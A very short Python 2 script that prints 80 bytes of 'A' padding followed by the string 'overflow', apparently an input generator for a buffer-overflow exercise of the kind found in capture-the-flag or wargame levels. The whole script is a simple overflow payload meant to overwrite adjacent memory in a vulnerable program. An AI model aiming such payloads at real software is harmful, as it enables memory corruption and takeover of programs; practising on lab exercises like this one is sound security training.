#!/usr/bin/env python

padding = "AAAA" * (0x55-0x41)
var = "overflow"
print padding + var
